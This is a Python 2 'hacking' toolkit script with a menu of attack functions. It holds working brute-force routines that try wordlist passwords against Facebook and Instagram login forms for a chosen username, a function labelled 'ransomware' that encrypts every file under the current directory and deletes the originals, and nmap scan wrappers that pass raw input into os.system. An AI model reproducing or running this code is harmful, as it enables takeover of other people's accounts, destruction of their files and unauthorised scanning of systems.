#!/usr/bin/env python
import mechanize
from bs4 import BeautifulSoup
import requests
import urllib
import urllib2
import requests
import ssl
import json
import nmap
import cookielib
import sys
import time
import socket
import SocketServer
import thread

from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys, pkg_resources


print "Welcome To DK's Community"
print "Note--> Press ctrl+C for Back(Option)"
def HackInfo():
    try:
        print "Please Enter The Url Containing Form To Hack int Below Format:"
        print "http://www.facebook.com/login"
        url = raw_input()
        print "Hacking via urllib..."
        scontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        op = urllib.urlopen(url, context=scontext)
        data = op.read()
        cod = op.code
        if (cod == 200):
            print str(cod) + " " + "Ok"
            print data
            print ""
            print "Hacking Source Code via BeautifulSoup..."
            bs = BeautifulSoup(data, "lxml")
            print bs.title.string
            print bs
            print "\n"
        else:
            print "Please enter a valid url"
            return
    except KeyboardInterrupt:
        return

def NmapSite():
    try:
        print "Please Enter The Url Containing Form To Hack int Below Format:"
        print "www.fb.com"
        url = raw_input()
        ip = socket.gethostbyname(url)
        nm = nmap.PortScanner()
        print "Scanning...."
        print "Ip: " + str(ip)
        print "Scan Result" + "\n" + str(nm.scan(ip, '22-443'))
        print "HostName: " + str(nm[ip].hostname())
        print "State: " + str(nm[ip].state())
        print "All_Protocols: " + str(nm[ip].all_protocols())
        list = []
        print "tcp keys " + str(nm[ip]['tcp'].keys())
        list = nm[ip]['tcp'].keys()
        size = len(list)
        for i in range(size):
            print str(list[i]) + ":" + str(nm[ip].tcp(list[i]))

        print "Udp: " + str(nm[ip].all_udp())
        print "Sctp: " + str(nm[ip].all_sctp())
        return
    except KeyboardInterrupt:
        return


def BruteforceForms():
    try:
        print "Reminder-->Plz save your file in the directory in which this script is stored!"
        url2 = "https://www.facebook.com/login.php?"
        br = mechanize.Browser()
        br.set_handle_equiv(True)
        br.set_handle_gzip(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        cj = cookielib.LWPCookieJar()
        br.set_cookiejar(cj)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

        br.open(url2)

        ll = br.title()

        dec = ll.decode('UTF8')

        print "Enter the username you want to bruteforce"
        user = raw_input()
        print "Enter the name of password.txt file"
        p = raw_input()
        flag = 0
        with open(p, "r") as ins:

            for line in ins:
                br.select_form(nr=0)
                br.method = 'POST'
                br['email'] = user
                br['pass'] = line
                br.submit()
                ll = br.title()
                dec2 = ll.decode('UTF8')
                print dec2
                if (dec != dec2):
                    print "Password Found=" + line
                    flag = 1
                    break
                else:
                    print "Retrying..."
        if (flag == 0):
            print "Password Not Found!"
        return
    except KeyboardInterrupt:
        return
def Insta():
    try:
        print "Reminder-->Plz save your file in the directory in which this script is stored!"
        url = "https://www.instagram.com/accounts/login/?force_classic_login"
        br = mechanize.Browser()
        br.set_handle_equiv(True)
        br.set_handle_gzip(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        cj = cookielib.LWPCookieJar()
        br.set_cookiejar(cj)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        br.addheaders = [('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0')]
        br.open(url)

        ll = br.title()

        dec = ll.decode('UTF8')

        print "Enter the username you want to bruteforce"
        user = raw_input()
        print "Enter the name of password.txt file"
        p = raw_input()
        flag = 0
        with open(p, "r") as ins:

            for line in ins:
                br.select_form(nr=0)
                br.method = 'POST'
                br['username'] = user
                br['password'] = line
                br.submit()
                ll = br.title()
                dec2 = ll.decode('UTF8')
                print dec2
                if (dec != dec2):
                    print "Password Found=" + line
                    flag = 1
                    break
                else:
                    print "Retrying..."
        if (flag == 0):
            print "Password Not Found!"
        return
    except KeyboardInterrupt:
        return

def encrypt(key, filename):
    chunksize = 64 * 1024
    outFile = os.path.join(os.path.dirname(filename), "(encrypted)" + os.path.basename(filename))
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV = ''

    for i in range(16):
        IV += chr(random.randint(0, 0xFF))

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, "rb") as infile:
        with open(outFile, "wb") as outfile:
            outfile.write(filesize)
            outfile.write(IV)
            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break

                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))


def decrypt(key, filename):
    outFile = os.path.join(os.path.dirname(filename), os.path.basename(filename[11:]))
    chunksize = 64 * 1024
    with open(filename, "rb") as infile:
        filesize = infile.read(16)
        IV = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(outFile, "wb") as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break

                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(int(filesize))


def allfiles():
    allFiles = []
    f = open("EnCrYpTeD_FiLe_LiSt.txt", "w+")
    for root, subfiles, files in os.walk(os.getcwd()):
        for names in files:
            if not names.startswith("(encrypted)"):
                f.write("(encrypted)" + names+"\n")
            else:
                f.write(names+"\n")
            allFiles.append(os.path.join(root, names))

    return allFiles



def ransomware():
    try:
        choice = raw_input("Do you want to (E)ncrypt or (D)ecrypt? ")
        password = raw_input("Enter the password: ")

        encFiles = allfiles()

        if choice == "E":

            for Tfiles in encFiles:
                if os.path.basename(Tfiles).startswith("(encrypted)"):
                    print "%s is already encrypted" % str(Tfiles)
                    pass
                elif os.path.basename(Tfiles).startswith("EnCrYpTeD_FiLe_LiSt.txt"):
                    print "Not Encryptable"
                    pass
                elif Tfiles == os.path.join(os.getcwd(), sys.argv[0]):
                    pass
                else:

                    encrypt(SHA256.new(password).digest(), str(Tfiles))
                    print "Done encrypting %s" % str(Tfiles)
                    os.remove(Tfiles)


        elif choice == "D":
            p = raw_input("Enter the file_list name to decrypt: ")
            with open(p, "r") as ins:
                for ps in ins:
                    ps = ps.strip()
                    if not os.path.exists(ps):
                        print "The file does not exist"

                    elif not ps.startswith("(encrypted)"):
                        print "%s is already not encrypted" % ps

                    else:
                        decrypt(SHA256.new(password).digest(), ps)
                        print "Done decrypting %s" % ps
                        os.remove(ps)

        else:
            print "Please choose a valid command."
        return
    except KeyboardInterrupt:
        return

def advnmap():
    try:
        print "Please Enter The domain/ip you want to Nmap!"
        x = raw_input()
        print " "
        print "Syn Services Scanning...."
        os.system("nmap -sS " + x)
        print " "
        print "Checking For Operating System....."
        os.system("nmap -sT -sV " + x)
        return
    except KeyboardInterrupt:
        return

Select = {0: HackInfo,
          1: NmapSite,
          2: BruteforceForms,
          3: Insta,
          4: ransomware,
          5: advnmap
          }

while (1):
    try:
        print "Let Us Start"
        print "Choose Your Option Wisely"
        print "0: HackInfo"
        print "1: NmapSite"
        print "2: Bruteforce Facebook"
        print "3: Bruteforce Instagram"
        print "4: Encrypt/Decrypt"
        print "5: Advance Nmap"
        print "6: Exit"
        selector = int(input())
        if (selector >= 0) and (selector <= 5):
            Select[selector]()
        elif (selector == 6):
            print "Exiting...."
            time.sleep(1)
            print "...."
            sys.exit()
        else:
            print "Invalid Option..."
            print "....."
            print "\n"
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit(0)
